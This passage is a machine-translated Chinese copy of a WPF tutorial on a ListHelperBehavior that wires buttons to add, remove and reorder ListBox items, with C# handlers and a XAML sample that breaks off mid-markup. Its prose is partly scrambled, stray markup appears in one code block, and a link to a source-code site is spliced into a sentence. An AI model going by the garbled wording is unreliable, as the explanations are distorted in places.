&lt;p&gt;&lt;span&gt;&lt;span&gt;这用于为&lt;/span&gt;&lt;span&gt;包含列表&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;（或&lt;/span&gt;&lt;code&gt;ListBox&lt;/code&gt;&lt;span&gt;&lt;span&gt;）控件&lt;/span&gt;&lt;span&gt;提供绑定&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;它用于&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;&lt;span&gt;执行动作，在这种情况下是将所选项目向上移动一个位置。&lt;/span&gt;&lt;span&gt;对于这个动作的代码需要有机会获得&lt;/span&gt;&lt;/span&gt;&lt;code&gt;ItemsSource&lt;/code&gt;&lt;span&gt;和&lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;控制，首先要真正能够做到移动，第二知道要移动的项目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;对于所有操作，此代码几乎相同，只是&lt;/span&gt;&lt;strong&gt;Add Item&lt;/strong&gt;&lt;span&gt;不需要监视&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;事件&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;，并且&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;永远不会禁用。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当此&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;更改时，将&lt;/span&gt;&lt;code&gt;OnMoveUpItemChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;执行&lt;/span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;此事件处理程序在&lt;/span&gt;&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;&lt;span&gt;RegisterAttached方法&lt;/span&gt;&lt;span&gt;的FrameworkMetadata参数中指定&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide84243&quot;&gt;隐藏   &lt;span id=&quot;copycode84243&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void OnMoveItemUpChanged(DependencyObject d,
    DependencyPropertyChangedEventArgs e)
{
    &lt;span class=&quot;code-keyword&quot;&gt;if (e.OldValue is Selector Selector1)
    {
        Selector1.SelectionChanged -= SetMoveItemUpButtonIsEnabled;
    }
    &lt;span class=&quot;code-keyword&quot;&gt;if (e.NewValue is Selector Selector)
    {
        &lt;span class=&quot;code-keyword&quot;&gt;var Button = CheckForButtonBase(d);
        Button.Click -= MoveItemUpEvent;
        Button.Click += MoveItemUpEvent;
        Selector.SetValue(MoveUpButton, Button);
        Selector.SelectionChanged += SetMoveItemUpButtonIsEnabled;
        SetMoveItemUpButtonIsEnabled(Selector, &lt;span class=&quot;code-keyword&quot;&gt;null);
    }
}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;此代码将事件处理程序附加到&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;Click事件和&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件。&lt;/span&gt;&lt;span&gt;为了确保&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;&lt;span&gt;在订阅事件之前没有双重订阅Click事件&lt;/span&gt;&lt;span&gt;，并且删除&lt;/span&gt;&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;旧&lt;/span&gt;&lt;span&gt;事件的事件处理程序&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;（如果存在）。&lt;/span&gt;&lt;span&gt;此外，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;它保存在附件&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;中，&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;以便可以找到它以供&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;使用&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;最后，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;通过使用&lt;/span&gt;&lt;code&gt;SelectionChanged&lt;/code&gt;&lt;span&gt;&lt;span&gt;事件处理程序&lt;/span&gt;&lt;span&gt;调整IsEnabled值&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;为的保存代码&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;在&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;被下面的私人&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;从而使&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;被启用和禁用，可以发现：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide747570&quot;&gt;隐藏   &lt;span id=&quot;copycode747570&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static readonly DependencyProperty MoveUpButton =
    DependencyProperty.RegisterAttached(&lt;span class=&quot;code-string&quot;&gt;&quot;&lt;span class=&quot;code-string&quot;&gt;MoveUpButton&quot;,
        &lt;span class=&quot;code-keyword&quot;&gt;typeof(ButtonBase), &lt;span class=&quot;code-keyword&quot;&gt;typeof(ListHelperBehavior),
            &lt;span class=&quot;code-keyword&quot;&gt;new PropertyMetadata(&lt;span class=&quot;code-keyword&quot;&gt;null));
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;Add Item代码不需要监视SelectionChanged事件，因为&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;从不禁用它。&lt;/span&gt;&lt;br/&gt;&lt;span&gt;的Click事件&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;strong&gt;下移&lt;/strong&gt;&lt;span&gt;功能如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide813057&quot;&gt;隐藏   &lt;span id=&quot;copycode813057&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void MoveItemUpEvent(object sender, RoutedEventArgs e)
{
    Debug.Assert(sender is ButtonBase);
    &lt;span class=&quot;code-keyword&quot;&gt;var Button = (ButtonBase)sender;
    &lt;span class=&quot;code-keyword&quot;&gt;var Selector = GetMoveItemUp(Button);
    &lt;span class=&quot;code-keyword&quot;&gt;var IList = CheckForIList(Selector);
    &lt;span class=&quot;code-keyword&quot;&gt;var itemNumber = Selector.SelectedIndex;
    &lt;span class=&quot;code-keyword&quot;&gt;var item = IList[itemNumber];
    IList.RemoveAt(itemNumber);
    &lt;span class=&quot;code-keyword&quot;&gt;var type = IList.GetType().GetGenericArguments().Single();
    &lt;span class=&quot;code-keyword&quot;&gt;var castInstance = Convert.ChangeType(item, type);
    IList.Insert(itemNumber - &lt;span class=&quot;code-digit&quot;&gt;1, castInstance);
    &lt;span class=&quot;code-keyword&quot;&gt;if (itemNumber == &lt;span class=&quot;code-digit&quot;&gt;1) Button.IsEnabled = &lt;span class=&quot;code-keyword&quot;&gt;false;
    Selector.SelectedIndex = itemNumber - &lt;span class=&quot;code-digit&quot;&gt;1;
}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;sender参数必须强制转换为ButtonBase类型，然后用于获取&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;作为ButtonBase中附加属性保存&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;&lt;span&gt;控件&lt;/span&gt;&lt;span&gt;的值&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;然后使用它来获取&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;绑定到&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;ItemsSource&lt;/code&gt; &lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;&lt;span&gt;值&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;值&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;。&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;然后复制&lt;/span&gt;&lt;span&gt;所选项目&lt;/span&gt;&lt;span&gt;，转换为正确的类型（使用Type类的Reflection GetGenericArgument方法获取类型，然后使用Convert.ChangeType方法将其强制转换），然后从&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;（RemoveAt方法）中&lt;/span&gt;&lt;span&gt;删除&lt;/span&gt;&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;span&gt;然后使用该&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;Insert&lt;/code&gt;&lt;span&gt;&lt;span&gt;方法&lt;/span&gt;&lt;span&gt;插入删除的项目&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来检查是否现在是第一个项目，禁用&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;它是否为，并且&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt; &lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;设置为仍然指向同一个项目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;该&lt;/span&gt;&lt;strong&gt;移&lt;/strong&gt;&lt;span&gt;码几乎是相同的，则&lt;/span&gt;&lt;strong&gt;删除&lt;/strong&gt;&lt;span&gt;要简单得多，因为它没有保存已删除的项目，然后将其放回&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最后，有适当的代码启用或禁用&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;取决于是否存在&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;，&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;是第一个（用于上&lt;/span&gt;&lt;strong&gt;移&lt;/strong&gt;&lt;span&gt;）或最后一个项目&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;（用于&lt;/span&gt;&lt;strong&gt;下移&lt;/strong&gt;&lt;span&gt;&lt;span&gt;）。&lt;/span&gt;&lt;span&gt;这是&lt;/span&gt;&lt;/span&gt;&lt;code&gt;SelectedItem&lt;/code&gt;&lt;span&gt;在&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;触发&lt;/span&gt;&lt;span&gt;事件&lt;/span&gt;&lt;span&gt;时调用的事件处理程序&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;prehide430275&quot;&gt;隐藏   &lt;span id=&quot;copycode430275&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;JavaScript&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private &lt;span class=&quot;code-keyword&quot;&gt;static &lt;span class=&quot;code-keyword&quot;&gt;void SetMoveItemUpButtonIsEnabled(object sender, RoutedEventArgs e)
 {
 &amp;lt;code&amp;gt;    Debug.Assert(sender is Selector);
     &lt;span class=&quot;code-keyword&quot;&gt;var Selector = (Selector)sender;
     &lt;span class=&quot;code-keyword&quot;&gt;var IList = CheckForIList(Selector);
     &lt;span class=&quot;code-keyword&quot;&gt;var itemNumber = Selector.SelectedIndex;
     &lt;span class=&quot;code-keyword&quot;&gt;var Button = (ButtonBase) Selector.GetValue(MoveUpButton);
     Button.IsEnabled = (itemNumber &amp;gt;= &lt;span class=&quot;code-digit&quot;&gt;1 &amp;amp;&amp;amp; itemNumber &amp;lt; IList.Count);
 }&lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;/&lt;span class=&quot;code-leadattribute&quot;&gt;code&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;对于这种需要&lt;/span&gt;&lt;code&gt;IList&lt;/code&gt;&lt;span&gt;绑定到&lt;/span&gt;&lt;code&gt;ItemsSource&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;，并需要得到&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;保存为一个附加属性在此功能&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;。&lt;/span&gt;&lt;span&gt;对于&lt;/span&gt;&lt;/span&gt;&lt;strong&gt;Remove&lt;/strong&gt;&lt;span&gt;函数，只需要知道if &lt;/span&gt;&lt;code&gt;SelectedIndex&lt;/code&gt;&lt;span&gt;是否等于-1，这样简单得多。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;使用行为&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;要使用此&lt;/span&gt;&lt;strong&gt;行为，&lt;/strong&gt;&lt;span&gt;只需要一个从&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;&lt;span&gt;控件&lt;/span&gt;&lt;span&gt;派生的列表控件，&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Name&lt;/code&gt;&lt;span&gt;&lt;span&gt;为此控件&lt;/span&gt;&lt;span&gt;关联一个&lt;/span&gt;&lt;span&gt;值，并&lt;/span&gt;&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt;&lt;span&gt;为每个应该实现的函数定义一个&lt;span&gt;&lt;a href=&quot;http://www.codesocang.com&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;网站源码&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;。在每一个&lt;/span&gt;&lt;code&gt;Button&lt;/code&gt; &lt;strong&gt;XAML&lt;/strong&gt;&lt;span&gt;只包括&lt;/span&gt;&lt;code&gt;ListHelperBahavior&lt;/code&gt;&lt;span&gt;与&lt;/span&gt;&lt;code&gt;DependencyProperty&lt;/code&gt;&lt;span&gt;它有关联&lt;/span&gt;&lt;code&gt;Binding&lt;/code&gt;&lt;span&gt;的&lt;/span&gt;&lt;code&gt;Selector&lt;/code&gt;&lt;span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;div id=&quot;premain242785&quot; class=&quot;pre-action-link&quot;&gt;&lt;span id=&quot;prehide242785&quot;&gt;隐藏   &lt;span id=&quot;preShrink242785&quot;&gt;收缩 &lt;img id=&quot;preimg242785&quot; src=&quot;https://www.codeproject.com/images/arrow-up-16.png&quot; alt=&quot;WPF行为的图像1为按钮提供了添加，删除和重新排列ListBox内容的功能&quot;/&gt;   &lt;span id=&quot;copycode242785&quot;&gt;复制代码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;pre class=&quot;notranslate&quot; data-lang-guess=&quot;XML&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Margin&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;10&quot;&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid.RowDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;RowDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Height&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;*&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;RowDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Height&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Auto&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid.RowDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ListBox&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Name&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;TheList&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;ItemsSource&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding List}&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;HorizontalAlignment&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Stretch&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;VerticalAlignment&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;Stretch&quot;&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ListBox.ItemTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
            &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;DataTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;Grid.ColumnDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ColumnDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Width&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;30&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;ColumnDefinition&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Width&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;200&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid.ColumnDefinitions&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;TextBlock&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Text&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding ItemNumber}&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;TextBlock&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Grid.Column&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;1&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Text&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;{Binding TimeCreated}&quot;&lt;span class=&quot;code-keyword&quot;&gt;/&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
                &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/Grid&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
            &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/DataTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
        &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/ListBox.ItemTemplate&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;/ListBox&lt;span class=&quot;code-keyword&quot;&gt;&amp;gt;
    &lt;span class=&quot;code-keyword&quot;&gt;&amp;lt;&lt;span class=&quot;code-leadattribute&quot;&gt;StackPanel&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Grid.Row&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;2&quot;&lt;span class=&quot;code-attribute&quot;&gt;
&lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt; &lt;span class=&quot;code-attribute&quot;&gt;Margin&lt;span class=&quot;code-keyword&quot;&gt;=&quot;&lt;span class=&quot;code-keyword&quot;&gt;-5 5&quot;&lt;span class=&quot;code-attribute&quot;&gt;
